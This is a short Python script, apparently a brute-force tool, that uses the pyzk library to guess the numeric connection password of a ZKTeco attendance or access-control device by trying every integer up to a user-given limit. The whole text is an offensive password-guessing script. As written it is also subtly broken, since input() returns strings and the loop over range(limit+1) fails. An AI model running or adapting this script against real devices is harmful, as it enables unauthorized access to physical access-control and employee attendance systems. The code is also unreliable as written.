from zk import ZK
from zk.exception import ZKErrorResponse


ip = input('Enter ip address : ')
port = input('Enter port number (default: 4370): ')
limit = input('Enter highest password limit : ')
for i in range(limit+1):
    try:
        ZK(ip, port, 30, i).connect()
        print('Successful connection on password : {}'.format(i))
        break
    except ZKErrorResponse:
        print('Failed password : {}'.format(i))
        continue
